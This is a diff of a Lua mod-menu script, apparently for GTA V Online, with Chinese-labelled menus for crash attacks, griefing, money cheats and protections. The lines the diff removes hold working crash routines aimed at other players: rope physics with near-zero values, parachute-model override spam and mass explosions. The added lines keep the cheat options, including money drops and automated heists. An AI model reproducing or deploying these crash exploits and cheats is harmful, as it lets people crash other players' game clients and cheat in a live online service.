-    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-    local Object_pizza1 = CreateVehicle(1131912276,TargetPlayerPos,0)
-    local Object_pizza2 =CreateObject(2981279339,TargetPlayerPos)
-        TargetPlayerPos.y = TargetPlayerPos.y + 2
-        TargetPlayerPos.z = TargetPlayerPos.z + 70 
-        ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)
-        ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-        ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true)
-    util.yield(5000)
-    do
-        for i = 0, 30 do 
-            pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
-            for j = -2, 2 do 
-                for k = -2, 2 do 
-                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
-                    FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
-                end
-            end
-            util.yield(20)
-        end
-    end    
-    entities.delete_by_handle(Object_pizza1)
-    entities.delete_by_handle(Object_pizza2)
-    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
-    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
-    util.yield(1)
-    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
-    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
-    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
-    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
-    util.yield(300)
-    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
-    util.yield(1000)
-    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
-    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
-
-    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
-    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
-    SelfPlayerPos.x = SelfPlayerPos.x + 10
-    TargetPlayerPos.x = TargetPlayerPos.x + 10
-    local carc = CreateVehicle(2598821281, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-    local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
-    local pedc = CreatePed(26, 2597531625, TargetPlayerPos, 0)
-    local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
-    local ropec = PHYSICS.ADD_ROPE(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
-    PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
-    util.yield(3500)
-    PHYSICS.DELETE_CHILD_ROPE(ropec)
-    entities.delete_by_handle(carc)
-    entities.delete_by_handle(pedc)
-    end)
-    menu.action(quanjubengkui, "闪电崩溃", {"flash12"}, "", function(on_loop)
-        PHYSICS.ROPE_LOAD_TEXTURES()
-        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
-        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
-        pos.x = pos.x+5
-        ppos.z = ppos.z+1
-        cargobob = entities.create_vehicle(2132890591, pos, 0)
-        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
-        kur = entities.create_ped(26, 2727244247, ppos, 0)
-        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
-        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
-        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
-        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
-    end)
-menu.action(quanjubengkui, "撒比小呆呆全局崩", {}, "", function()
-    nature()
-    CARGO()
-    math1()
-    math2()
-    flash12()
-    notification("崩溃结束" ,colors.black)
-end)
-airplane_collapsed = menu.list(quanjubengkui, "飞机模型崩溃", {}, "慎用！！！")
-    menu.toggle_loop(airplane_collapsed, "开始崩溃", {}, "耗时很久", function()
-        airplane_collapsed1()
-    end)
-    players.dispatch_on_join()
-    menu.action(airplane_collapsed, "防崩镜头关闭", {}, "", function()
-        menu.trigger_commands("anticrashcamera off")
-    end)
-function nature()
-    local user = players.user()
-    local user_ped = players.user_ped()
-    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
-        util.yield(100)
-        ENTITY.SET_ENTITY_VISIBLE(user_ped, false)
-        for i = 0, 110 do
-            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
-            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
-            util.yield(25)
-            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-        end
-        for i = 1, 5 do
-            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
-        end
-        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
-        local pos = players.get_position(user)
-        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
-        ENTITY.SET_ENTITY_VISIBLE(user_ped, true)
-        end
-function CARGO()
-    menu.trigger_commands("anticrashcam on")
-    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
-    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
-    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
-    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
-    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
-    util.yield(2500)
-    entities.delete_by_handle(cargobob)
-    entities.delete_by_handle(veh)
-    PHYSICS.DELETE_CHILD_ROPE(newRope)
-    menu.trigger_commands("anticrashcam off")
-end
-function math1()
-    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-     local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
-     playpos.x = playpos.x + 10
-     local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
-     local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
-     local pedc = CreatePed(26, 2597531625, playpos, 0)
-     local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
-     local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
-     PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
-     util.yield(2500)
-     PHYSICS.DELETE_CHILD_ROPE(ropec)
-     entities.delete_by_handle(carc)
-     entities.delete_by_handle(pedc)
-end
- TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
 quanjuegao = menu.list(quanju,"全局恶搞", {},"恶搞全局~")
 menu.toggle_loop(quanjuegao,  "阻挡进入高跟鞋", {}, "拒绝奖励，从我做起！", function()
     local mdd = util.joaat("h4_prop_h4_garage_door_01a")
@@ -5331,6 +3454,13 @@ chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
         end
     end
 end)
+zidongfanyiV3 = menu.list(fanyiyuyan,"聊天翻译V3", {},"最新翻译系统，支持ChatGPT")
+zidongfanyiV31 = menu.action(zidongfanyiV3, "加载聊天翻译V3选项", {""}, "", function()
+        notification("正在加载聊天翻译V3选项,请稍等...",colors.black)
+        util.yield(2000)
+        require "lib.YeMulib.YMfyV3"
+        menu.delete(zidongfanyiV31)
+end)
 local weapon_options = menu.list(self, "冲锋选项", {}, "")
 menu.toggle_loop(weapon_options, '无敌冲锋', {}, '使用近战时将附近模型推开', function ()
 	local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
@@ -6025,6 +4155,9 @@ renwu_disable = menu.toggle_loop(protections, "禁用阻止实体轰炸", {"disa
     end
 end)
 menu.set_value(renwu_disable,true)
+menu.action(protections,"战局卡顿自救", {}, "会在天上加载20-30秒，主机不会改变（如果你是主机）", function ()
+    menu.trigger_commands("restartfm")
+end)
 menu.divider(protections, "崩溃保护")	
     menu.toggle_loop(protections, "拦截不好载具", {}, "如货机等(刷不出来车请关掉此防护)", function()
     dibai8()
@@ -6194,36 +4327,6 @@ menu.toggle_loop(protections, "攻击反弹V2", {"crashrebound2"}, "", function(
                 end
             end
         end
-    end
-end)
-menu.divider(protections, "防套笼保护")
-local anticage = menu.list(protections, "防套笼", {}, "使你无法被任何物体所笼罩")
-local alpha = 160
-menu.slider(anticage, "笼子Alpha", {"cagealpha"}, "物体将具有的透明度", 0, #values, 3, 1, function(amount)
-    alpha = values[amount]
-end)
-menu.toggle_loop(anticage, "启用笼子拦截", {"anticage"}, "", function()
-    local user = players.user_ped()
-    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
-    local my_ents = {user, veh}
-    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
-        local net_obj = memory.read_long(obj_ptr + 0xd0)
-        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
-            continue
-        end
-        local obj_handle = entities.pointer_to_handle(obj_ptr)
-        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
-        for i, data in ipairs(my_ents) do
-            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
-                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
-                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
-                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
-            end
-            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
-                entities.delete_by_handle(obj_handle)
-            end
-        end
-        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
     end
 end)
 menu.divider(protections, "玩家信息检测")
@@ -6940,10 +5043,17 @@ end
 util.keep_running()
 end)
 jiazaixianshi = menu.list(misc,"加载显示选项", {},"此选项内包含加载夜幕显示选项")
-show_time = menu.toggle(jiazaixianshi, "显示时间", {"timeos"}, "", function(state)
+show_time_list = menu.list(jiazaixianshi,"显示时间选项",{},"")
+show_time = menu.toggle(show_time_list, "显示时间", {"timeos"}, "", function(state)
     xianshishijian(state)
 end)
 menu.set_value(show_time, config_active2)
+show_time_x = menu.slider(show_time_list, "x坐标", {"show_time-x"}, "配置[√]", -1000, 1000, config_active2_x, 10, function(x_)
+     showtime_x(x_)
+end)
+show_time_y = menu.slider(show_time_list, "y坐标", {"show_time-y"}, "配置[√]", -1000, 1000, config_active2_y, 10, function(y_)
+     showtime_y(y_)
+end)
 script_name = menu.toggle(jiazaixianshi, "显示脚本名称", {"scriptname"}, "", function(state)
     xianshijiaoben1(state)
 end)
@@ -7284,6 +5394,44 @@ else
 end
 util.keep_running()
 end)
+YUANSHEN = menu.list(misc, '原神？启动？！', {'YuanP'}, '原？原？原？原神，启动！！！')
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+YUANSHENaction = menu.action(YUANSHEN, "加载原神选项", {""}, "原神，启动！", function()
+store_dir = filesystem.store_dir() .. '\\YMss\\'
+sound_selection_dir = store_dir .. '\\sound6.txt'
+if not filesystem.is_dir(store_dir) then
+    util.toast("夜幕音频没有正确安装！.")
+    util.stop_script()
+end
+fp = io.open(sound_selection_dir, 'r')
+local file_selection = fp:read('*a')
+fp:close()
+local sound_location = store_dir .. '\\' .. file_selection
+if not filesystem.exists(sound_location) then
+    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
+else
+    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
+end
+util.keep_running()
+      notification("原批，请耐心等待...",colors.black)
+      util.yield(3500)
+       require "lib.YeMulib.YuanShen"
+       menu.delete(YUANSHENaction)
+    end)
+pendants = menu.list(misc, '夜幕GIF', {'GIF'}, '原神，启动！！！')
+    kelilogo = menu.list(pendants, '可莉', {}, '')
+        menu.toggle(kelilogo, "开启", {}, "", function(on)
+            GIF_keli(on)
+        end)
+        menu.slider(kelilogo, "x坐标", {"logocoord1-x"}, "", -100, 100, 86, 1, function(x_)
+            logocoord1.x = x_ / 100
+        end)
+        menu.slider(kelilogo, "y坐标", {"logocoord1-y"}, "", -100, 100, 57, 1, function(y_)
+            logocoord1.y = y_ / 100
+        end)
+        menu.slider(kelilogo, "图标过渡帧率", {}, "", 1, 60, 20, 1, function(value)
+            logocoord1.fps = 1000 / value
+        end)
 module_list = menu.list(sc, "第一模组选项")
     require "lib.YeMulib.Constructor"
 script_meta_menu = menu.list(YM_root, "夜幕脚本支持", {}, "")
@@ -8101,23 +6249,6 @@ end)
          colour9 = newColour 
     end)
     menu.rainbow(trailColour)
-local ragdoll = menu.list(self, '碰瓷', {'JSragdollOptions'}, '想碰瓷吗？.（请勿在现实世界模仿~）')
-   local fallTimeout = false
-    menu.toggle(ragdoll, '碰瓷V1', {'JSfallOver'}, '', function(toggle)
-        if toggle then
-            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
-            PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
-        end
-        fallTimeout = toggle
-        while fallTimeout do
-            PED.RESET_PED_RAGDOLL_TIMER(players.user_ped())
-            util.yield_once()
-        end
-    end)
-
-    menu.toggle_loop(ragdoll, '碰瓷V2', {'JSragdoll'}, '', function()
-        ragdoll_self()
-    end)
 local yuleself = menu.list(self, "娱乐选项", {}, "对于自己的娱乐选项")
 menu.action(yuleself, "IKUN想和你玩个游戏", {}, "看看IKUN能否保护你？", function()
     if randomizer(array) == "1" then
@@ -8364,20 +6495,12 @@ ls_walkwater = menu.toggle(self, "在水上行走", {}, "",  function(on)
         menu.set_value(ls_driveonair, false)
     end
 end)
-menu.toggle_loop(self, '超级跳', {}, '按下跳跃的时间越长,继续走得更高（也可用于飞行）', function()
-        if PAD.IS_CONTROL_PRESSED(0, 22) or PAD.IS_CONTROL_JUST_PRESSED(0, 21) then
-            PED.SET_PED_CAN_RAGDOLL(players.user_ped(), false)
-            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(players.user_ped(), 1, 0.0, 0.6, 0.6, 0, 0, 0, 0, true, true, true, true)
-            if ENTITY.IS_ENTITY_IN_AIR(players.user_ped()) then
-                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(players.user_ped(), 1, 0.0, 0.6, 0.6, 0, 0, 0, 0, true, true, true, true)
-            end
-        end
-end)
-Heist_Control = menu.list(zidongrenwu, "HC(3.3.1)第一任务选项")
+Heist_Control = menu.list(zidongrenwu, "第一任务选项HC(3.3.4)")
  require "lib.YeMulib.YMhc"
 renwu = menu.list(zidongrenwu, "第二任务选项")
  require "lib.YeMulib.YMhc2"
 baoguo = menu.list(zidongrenwu,"武器厢型车传送", {},"一键传送到对应位置！~")
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
 zhaobaoguo = menu.action(baoguo, "加载厢型车地点传送选项", {""}, "寻找厢型车！", function()
         notification("正在加载武器厢型车地点传送,请稍等...",colors.blue)
         util.yield(2000)
@@ -8385,6 +6508,7 @@ zhaobaoguo = menu.action(baoguo, "加载厢型车地点传送选项", {""}, "寻
         menu.delete(zhaobaoguo)
     end)
 duchang = menu.list(zidongrenwu,"赌场（类似于刷钱）", {},"恢复选项！~")
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
 duchangxuanxiang = menu.action(duchang, "加载赌场选项", {""}, "！", function()
         notification("正在加载赌场选项,请稍等...",colors.blue)
         util.yield(2000)
@@ -8392,6 +6516,7 @@ duchangxuanxiang = menu.action(duchang, "加载赌场选项", {""}, "！", funct
         menu.delete(duchangxuanxiang)
     end)
 Musiness_Banager = menu.list(zidongrenwu, "自动产业 注:[风险]")
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
 Musiness_Banager_Load = menu.action(Musiness_Banager, "加载自动产业", {""}, "", function()
 notification("正在加载自动产业,请稍等",colors.black)
 util.yield(2000)
@@ -8404,6 +6529,7 @@ menu.divider(cash, "您有可能在未知的天数内被禁止")
 menu.divider(cash, "禁止是随机延迟的\n你已经被警告了！")
 cashmoney = menu.action(cash, "加载刷钱选项", {""}, "", function()
         notification("正在加载刷钱选项,请稍等...",colors.black)
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
         util.yield(1500)
         require "lib.YeMulib.YMcash"
         menu.delete(cashmoney)
